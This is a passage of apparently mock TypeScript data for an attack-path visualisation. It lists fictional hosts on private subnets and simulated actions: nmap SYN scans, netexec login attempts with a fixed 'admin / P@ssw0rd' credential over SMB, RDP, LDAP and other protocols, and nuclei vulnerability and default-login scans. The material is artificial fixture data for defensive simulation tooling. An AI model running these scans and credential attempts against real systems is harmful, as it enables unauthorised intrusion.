      node_agents:['openaev'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep14', node_type:'ASSET', node_label:'FILE-14', node_hostname:'FILE-14',
      node_ip:'192.168.50.14', node_platform:'Red Hat 8', node_status:'prevented',
      node_agents:['sentinel_one'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep15', node_type:'ASSET', node_label:'MAIL-15', node_hostname:'MAIL-15',
      node_ip:'192.168.50.15', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'Zone-A', node_subnet:'192.168.50.0/24' },
    { node_id:'sMX-ep16', node_type:'ASSET', node_label:'JUMP-16', node_hostname:'JUMP-16',
      node_ip:'192.168.51.1', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep17', node_type:'ASSET', node_label:'PRINT-17', node_hostname:'PRINT-17',
      node_ip:'192.168.51.2', node_platform:'Ubuntu 20.04 LTS', node_status:'detected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep18', node_type:'ASSET', node_label:'DNS-18', node_hostname:'DNS-18',
      node_ip:'192.168.51.3', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep19', node_type:'ASSET', node_label:'DC-19', node_hostname:'DC-19',
      node_ip:'192.168.51.4', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep20', node_type:'ASSET', node_label:'WS-20', node_hostname:'WS-20',
      node_ip:'192.168.51.5', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24', node_is_pivot:true },
    { node_id:'sMX-ep21', node_type:'ASSET', node_label:'WEB-21', node_hostname:'WEB-21',
      node_ip:'192.168.51.6', node_platform:'Windows Server 2019', node_status:'prevented',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep22', node_type:'ASSET', node_label:'APP-22', node_hostname:'APP-22',
      node_ip:'192.168.51.7', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep23', node_type:'ASSET', node_label:'DB-23', node_hostname:'DB-23',
      node_ip:'192.168.51.8', node_platform:'Windows 11', node_status:'detected',
      node_agents:['palo_alto'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep24', node_type:'ASSET', node_label:'FILE-24', node_hostname:'FILE-24',
      node_ip:'192.168.51.9', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep25', node_type:'ASSET', node_label:'MAIL-25', node_hostname:'MAIL-25',
      node_ip:'192.168.51.10', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep26', node_type:'ASSET', node_label:'JUMP-26', node_hostname:'JUMP-26',
      node_ip:'192.168.51.11', node_platform:'Windows Server 2019', node_status:'detected',
      node_agents:['openaev'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep27', node_type:'ASSET', node_label:'PRINT-27', node_hostname:'PRINT-27',
      node_ip:'192.168.51.12', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep28', node_type:'ASSET', node_label:'DNS-28', node_hostname:'DNS-28',
      node_ip:'192.168.51.13', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep29', node_type:'ASSET', node_label:'DC-29', node_hostname:'DC-29',
      node_ip:'192.168.51.14', node_platform:'CentOS 7', node_status:'prevented',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },
    { node_id:'sMX-ep30', node_type:'ASSET', node_label:'WS-30', node_hostname:'WS-30',
      node_ip:'192.168.51.15', node_platform:'Red Hat 8', node_status:'detected',
      node_agents:['palo_alto'],
      node_zone:'Zone-B', node_subnet:'192.168.51.0/24' },

    { node_id:'sMX-act-01', node_type:'ACTION', node_label:'nmap -sS → WEB-01',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,80,443 192.168.50.1' },
    { node_id:'sMX-act-02', node_type:'ACTION', node_label:'nmap -sS → APP-02',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,80,443 192.168.50.2' },
    { node_id:'sMX-act-03', node_type:'ACTION', node_label:'nmap -sS → DB-03',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 1433,3306 192.168.50.3' },
    { node_id:'sMX-act-04', node_type:'ACTION', node_label:'nmap -sS → FILE-04',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 445,139 192.168.50.4' },
    { node_id:'sMX-act-06', node_type:'ACTION', node_label:'nmap -sS → JUMP-06',
      node_status:'prevented', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,3389 192.168.50.6' },
    { node_id:'sMX-act-07', node_type:'ACTION', node_label:'nmap -sS → PRINT-07',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 9100,515 192.168.50.7' },
    { node_id:'sMX-act-08', node_type:'ACTION', node_label:'nmap -sS → DNS-08',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 53,445 192.168.50.8' },
    { node_id:'sMX-act-09', node_type:'ACTION', node_label:'nmap -sS → DC-09',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 88,389,445 192.168.50.9' },
    { node_id:'sMX-act-10', node_type:'ACTION', node_label:'nmap -sS → WS-10',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 135,445,3389 192.168.50.10' },
    { node_id:'sMX-act-11', node_type:'ACTION', node_label:'nmap -sS → WEB-11',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 8080,8443 192.168.50.11' },
    { node_id:'sMX-act-12', node_type:'ACTION', node_label:'nmap -sS → APP-12',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,873 192.168.50.12' },
    { node_id:'sMX-act-13', node_type:'ACTION', node_label:'nmap -sS → DB-13',
      node_status:'prevented', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 9200,5601 192.168.50.13' },
    { node_id:'sMX-act-14', node_type:'ACTION', node_label:'nmap -sS → FILE-14',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 1194,3389 192.168.50.14' },
    { node_id:'sMX-act-16', node_type:'ACTION', node_label:'netexec smb → JUMP-16',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 192.168.51.1 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-17', node_type:'ACTION', node_label:'netexec smb → PRINT-17',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 192.168.51.2 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-18', node_type:'ACTION', node_label:'netexec mssql → DNS-18',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'mssql 192.168.51.3 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-19', node_type:'ACTION', node_label:'netexec smb → DC-19',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 192.168.51.4 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-20', node_type:'ACTION', node_label:'netexec smb → WS-20',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 192.168.51.5 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-21', node_type:'ACTION', node_label:'netexec smb → WEB-21',
      node_status:'prevented', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 192.168.51.6 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-22', node_type:'ACTION', node_label:'netexec rdp → APP-22',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'rdp 192.168.51.7 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-23', node_type:'ACTION', node_label:'netexec ldap → DB-23',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ldap 192.168.51.8 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-24', node_type:'ACTION', node_label:'netexec smb → FILE-24',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 192.168.51.9 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-26', node_type:'ACTION', node_label:'netexec smb → JUMP-26',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 192.168.51.11 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-27', node_type:'ACTION', node_label:'netexec ssh → PRINT-27',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ssh 192.168.51.12 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-28', node_type:'ACTION', node_label:'netexec smb → DNS-28',
      node_status:'prevented', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 192.168.51.13 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-29', node_type:'ACTION', node_label:'netexec winrm → DC-29',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'winrm 192.168.51.14 -u admin -p P@ssw0rd' },
    { node_id:'sMX-act-30', node_type:'ACTION', node_label:'netexec ldap → WS-30',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ldap 192.168.51.15 -u admin -p P@ssw0rd', node_agent:'sentinel_one', node_agent:'sentinel_one' },
  ],
  attack_path_edges:[
    {edge_id:'sMX-al-01',edge_type:'asset_link',edge_source:'sMX-act-01',edge_target:'sMX-ep01'},
    {edge_id:'sMX-al-02',edge_type:'asset_link',edge_source:'sMX-act-02',edge_target:'sMX-ep02'},
    {edge_id:'sMX-al-03',edge_type:'asset_link',edge_source:'sMX-act-03',edge_target:'sMX-ep03'},
    {edge_id:'sMX-al-04',edge_type:'asset_link',edge_source:'sMX-act-04',edge_target:'sMX-ep04'},
    {edge_id:'sMX-al-06',edge_type:'asset_link',edge_source:'sMX-act-06',edge_target:'sMX-ep06'},
    {edge_id:'sMX-al-07',edge_type:'asset_link',edge_source:'sMX-act-07',edge_target:'sMX-ep07'},
    {edge_id:'sMX-al-08',edge_type:'asset_link',edge_source:'sMX-act-08',edge_target:'sMX-ep08'},
    {edge_id:'sMX-al-09',edge_type:'asset_link',edge_source:'sMX-act-09',edge_target:'sMX-ep09'},
    {edge_id:'sMX-al-10',edge_type:'asset_link',edge_source:'sMX-act-10',edge_target:'sMX-ep10'},
    {edge_id:'sMX-al-11',edge_type:'asset_link',edge_source:'sMX-act-11',edge_target:'sMX-ep11'},
    {edge_id:'sMX-al-12',edge_type:'asset_link',edge_source:'sMX-act-12',edge_target:'sMX-ep12'},
    {edge_id:'sMX-al-13',edge_type:'asset_link',edge_source:'sMX-act-13',edge_target:'sMX-ep13'},
    {edge_id:'sMX-al-14',edge_type:'asset_link',edge_source:'sMX-act-14',edge_target:'sMX-ep14'},
    {edge_id:'sMX-al-16',edge_type:'asset_link',edge_source:'sMX-act-16',edge_target:'sMX-ep16'},
    {edge_id:'sMX-al-17',edge_type:'asset_link',edge_source:'sMX-act-17',edge_target:'sMX-ep17'},
    {edge_id:'sMX-al-18',edge_type:'asset_link',edge_source:'sMX-act-18',edge_target:'sMX-ep18'},
    {edge_id:'sMX-al-19',edge_type:'asset_link',edge_source:'sMX-act-19',edge_target:'sMX-ep19'},
    {edge_id:'sMX-al-20',edge_type:'asset_link',edge_source:'sMX-act-20',edge_target:'sMX-ep20'},
    {edge_id:'sMX-al-21',edge_type:'asset_link',edge_source:'sMX-act-21',edge_target:'sMX-ep21'},
    {edge_id:'sMX-al-22',edge_type:'asset_link',edge_source:'sMX-act-22',edge_target:'sMX-ep22'},
    {edge_id:'sMX-al-23',edge_type:'asset_link',edge_source:'sMX-act-23',edge_target:'sMX-ep23'},
    {edge_id:'sMX-al-24',edge_type:'asset_link',edge_source:'sMX-act-24',edge_target:'sMX-ep24'},
    {edge_id:'sMX-al-26',edge_type:'asset_link',edge_source:'sMX-act-26',edge_target:'sMX-ep26'},
    {edge_id:'sMX-al-27',edge_type:'asset_link',edge_source:'sMX-act-27',edge_target:'sMX-ep27'},
    {edge_id:'sMX-al-28',edge_type:'asset_link',edge_source:'sMX-act-28',edge_target:'sMX-ep28'},
    {edge_id:'sMX-al-29',edge_type:'asset_link',edge_source:'sMX-act-29',edge_target:'sMX-ep29'},
    {edge_id:'sMX-al-30',edge_type:'asset_link',edge_source:'sMX-act-30',edge_target:'sMX-ep30'},
    {edge_id:'sMX-pivot-01-05',edge_type:'pivot',edge_source:'sMX-ep01',edge_target:'sMX-ep05'},
    {edge_id:'sMX-pivot-08-15',edge_type:'pivot',edge_source:'sMX-ep08',edge_target:'sMX-ep15'},
    {edge_id:'sMX-pivot-20-25',edge_type:'pivot',edge_source:'sMX-ep20',edge_target:'sMX-ep25'},
  ],
  attack_path_stats:{
    stats_prevented:4,stats_detected:8,stats_undetected:15,
    stats_pending:0,stats_total_actions:27,stats_executed_actions:27,
    stats_captured_endpoints:24,stats_captured_files:12,stats_captured_credentials:12,
stats_captured_users: 8,
stats_captured_cves: 5,
  },
  attack_path_definitions:[
    {path_id:'sMX-p1',path_name:'Lateral Movement Chain',path_color:'#4caf50',
      node_ids:['sMX-ep01','sMX-ep02','sMX-ep03','sMX-ep04','sMX-ep05','sMX-ep06','sMX-ep07','sMX-ep08','sMX-ep09','sMX-ep10','sMX-ep11','sMX-ep12','sMX-ep13','sMX-ep14','sMX-ep15','sMX-ep16','sMX-ep17','sMX-ep18','sMX-ep19','sMX-ep20','sMX-ep21','sMX-ep22','sMX-ep23','sMX-ep24','sMX-ep25','sMX-ep26','sMX-ep27','sMX-ep28','sMX-ep29','sMX-ep30'],path_outcome:'success'},
  ],
};
// ══════════════════════════════════════════════════════════════
// Single Path Injector — 30 Endpoints
// ══════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_SINGLE_30EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'sSP-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'10.50.0.1', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto', 'openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24', node_is_entry_point:true },
    { node_id:'sSP-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'10.50.0.2', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'10.50.0.3', node_platform:'Windows 11', node_status:'detected',
      node_agents:['openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep04', node_type:'ASSET', node_label:'FILE-04', node_hostname:'FILE-04',
      node_ip:'10.50.0.4', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep05', node_type:'ASSET', node_label:'MAIL-05', node_hostname:'MAIL-05',
      node_ip:'10.50.0.5', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep06', node_type:'ASSET', node_label:'JUMP-06', node_hostname:'JUMP-06',
      node_ip:'10.50.0.6', node_platform:'Windows Server 2019', node_status:'detected',
      node_agents:['openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep07', node_type:'ASSET', node_label:'PRINT-07', node_hostname:'PRINT-07',
      node_ip:'10.50.0.7', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep08', node_type:'ASSET', node_label:'DNS-08', node_hostname:'DNS-08',
      node_ip:'10.50.0.8', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep09', node_type:'ASSET', node_label:'DC-09', node_hostname:'DC-09',
      node_ip:'10.50.0.9', node_platform:'CentOS 7', node_status:'prevented',
      node_agents:['sentinel_one'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep10', node_type:'ASSET', node_label:'WS-10', node_hostname:'WS-10',
      node_ip:'10.50.0.10', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep11', node_type:'ASSET', node_label:'WEB-11', node_hostname:'WEB-11',
      node_ip:'10.50.0.11', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep12', node_type:'ASSET', node_label:'APP-12', node_hostname:'APP-12',
      node_ip:'10.50.0.12', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_agents:['openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep13', node_type:'ASSET', node_label:'DB-13', node_hostname:'DB-13',
      node_ip:'10.50.0.13', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep14', node_type:'ASSET', node_label:'FILE-14', node_hostname:'FILE-14',
      node_ip:'10.50.0.14', node_platform:'Red Hat 8', node_status:'detected',
      node_agents:['palo_alto'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep15', node_type:'ASSET', node_label:'MAIL-15', node_hostname:'MAIL-15',
      node_ip:'10.50.0.15', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep16', node_type:'ASSET', node_label:'JUMP-16', node_hostname:'JUMP-16',
      node_ip:'10.50.0.16', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep17', node_type:'ASSET', node_label:'PRINT-17', node_hostname:'PRINT-17',
      node_ip:'10.50.0.17', node_platform:'Ubuntu 20.04 LTS', node_status:'prevented',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep18', node_type:'ASSET', node_label:'DNS-18', node_hostname:'DNS-18',
      node_ip:'10.50.0.18', node_platform:'Windows 10', node_status:'detected',
      node_agents:['sentinel_one'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep19', node_type:'ASSET', node_label:'DC-19', node_hostname:'DC-19',
      node_ip:'10.50.0.19', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep20', node_type:'ASSET', node_label:'WS-20', node_hostname:'WS-20',
      node_ip:'10.50.0.20', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Corp Network', node_subnet:'10.50.0.0/24' },
    { node_id:'sSP-ep21', node_type:'ASSET', node_label:'WEB-21', node_hostname:'WEB-21',
      node_ip:'10.50.1.1', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep22', node_type:'ASSET', node_label:'APP-22', node_hostname:'APP-22',
      node_ip:'10.50.1.2', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep23', node_type:'ASSET', node_label:'DB-23', node_hostname:'DB-23',
      node_ip:'10.50.1.3', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep24', node_type:'ASSET', node_label:'FILE-24', node_hostname:'FILE-24',
      node_ip:'10.50.1.4', node_platform:'Red Hat 8', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep25', node_type:'ASSET', node_label:'MAIL-25', node_hostname:'MAIL-25',
      node_ip:'10.50.1.5', node_platform:'CentOS 7', node_status:'prevented',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep26', node_type:'ASSET', node_label:'JUMP-26', node_hostname:'JUMP-26',
      node_ip:'10.50.1.6', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep27', node_type:'ASSET', node_label:'PRINT-27', node_hostname:'PRINT-27',
      node_ip:'10.50.1.7', node_platform:'Ubuntu 20.04 LTS', node_status:'detected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep28', node_type:'ASSET', node_label:'DNS-28', node_hostname:'DNS-28',
      node_ip:'10.50.1.8', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep29', node_type:'ASSET', node_label:'DC-29', node_hostname:'DC-29',
      node_ip:'10.50.1.9', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['palo_alto', 'openaev'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },
    { node_id:'sSP-ep30', node_type:'ASSET', node_label:'WS-30', node_hostname:'WS-30',
      node_ip:'10.50.1.10', node_platform:'Red Hat 8', node_status:'detected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Server Network', node_subnet:'10.50.1.0/24' },

    { node_id:'sSP-act-01', node_type:'ACTION', node_label:'nmap -sS → WEB-01',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,80,443 10.50.0.1' },
    { node_id:'sSP-act-02', node_type:'ACTION', node_label:'nmap -sS → APP-02',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,80,443 10.50.0.2' },
    { node_id:'sSP-act-03', node_type:'ACTION', node_label:'nmap -sS → DB-03',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 1433,3306 10.50.0.3' },
    { node_id:'sSP-act-04', node_type:'ACTION', node_label:'nmap -sS → FILE-04',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 445,139 10.50.0.4' },
    { node_id:'sSP-act-05', node_type:'ACTION', node_label:'nmap -sS → MAIL-05',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 25,110,143 10.50.0.5' },
    { node_id:'sSP-act-06', node_type:'ACTION', node_label:'nmap -sS → JUMP-06',
      node_status:'detected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 22,3389 10.50.0.6' },
    { node_id:'sSP-act-07', node_type:'ACTION', node_label:'nmap -sS → PRINT-07',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 9100,515 10.50.0.7' },
    { node_id:'sSP-act-08', node_type:'ACTION', node_label:'nmap -sS → DNS-08',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 53,445 10.50.0.8' },
    { node_id:'sSP-act-09', node_type:'ACTION', node_label:'nmap -sS → DC-09',
      node_status:'prevented', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 88,389,445 10.50.0.9' },
    { node_id:'sSP-act-10', node_type:'ACTION', node_label:'nmap -sS → WS-10',
      node_status:'undetected', node_payload_name:'nmap', node_command:'nmap',
      node_arguments:'-sS -p 135,445,3389 10.50.0.10' },
    { node_id:'sSP-act-11', node_type:'ACTION', node_label:'netexec smb → WEB-11',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 10.50.0.11 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-12', node_type:'ACTION', node_label:'netexec smb → APP-12',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 10.50.0.12 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-13', node_type:'ACTION', node_label:'netexec mssql → DB-13',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'mssql 10.50.0.13 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-14', node_type:'ACTION', node_label:'netexec smb → FILE-14',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 10.50.0.14 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-15', node_type:'ACTION', node_label:'netexec smb → MAIL-15',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 10.50.0.15 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-16', node_type:'ACTION', node_label:'netexec smb → JUMP-16',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 10.50.0.16 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-17', node_type:'ACTION', node_label:'netexec rdp → PRINT-17',
      node_status:'prevented', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'rdp 10.50.0.17 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-18', node_type:'ACTION', node_label:'netexec ldap → DNS-18',
      node_status:'detected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'ldap 10.50.0.18 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-19', node_type:'ACTION', node_label:'netexec smb → DC-19',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 10.50.0.19 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-20', node_type:'ACTION', node_label:'netexec smb → WS-20',
      node_status:'undetected', node_payload_name:'netexec', node_command:'netexec',
      node_arguments:'smb 10.50.0.20 -u admin -p P@ssw0rd' },
    { node_id:'sSP-act-21', node_type:'ACTION', node_label:'nuclei scan → WEB-21',
      node_status:'undetected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t cves/ -u http://10.50.1.1' },
    { node_id:'sSP-act-22', node_type:'ACTION', node_label:'nuclei scan → APP-22',
      node_status:'detected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t cves/ -u http://10.50.1.2' },
    { node_id:'sSP-act-23', node_type:'ACTION', node_label:'nuclei scan → DB-23',
      node_status:'undetected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t misconfigurations/ -u http://10.50.1.3' },
    { node_id:'sSP-act-24', node_type:'ACTION', node_label:'nuclei scan → FILE-24',
      node_status:'undetected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t vulnerabilities/ -u http://10.50.1.4' },
    { node_id:'sSP-act-25', node_type:'ACTION', node_label:'nuclei scan → MAIL-25',
      node_status:'prevented', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t cves/ -u http://10.50.1.5' },
    { node_id:'sSP-act-26', node_type:'ACTION', node_label:'nuclei scan → JUMP-26',
      node_status:'undetected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t exposures/ -u http://10.50.1.6' },
    { node_id:'sSP-act-27', node_type:'ACTION', node_label:'nuclei scan → PRINT-27',
      node_status:'detected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t cves/ -u http://10.50.1.7' },
    { node_id:'sSP-act-28', node_type:'ACTION', node_label:'nuclei scan → DNS-28',
      node_status:'undetected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t default-logins/ -u http://10.50.1.8' },
    { node_id:'sSP-act-29', node_type:'ACTION', node_label:'nuclei scan → DC-29',
      node_status:'undetected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t cves/ -u http://10.50.1.9' },
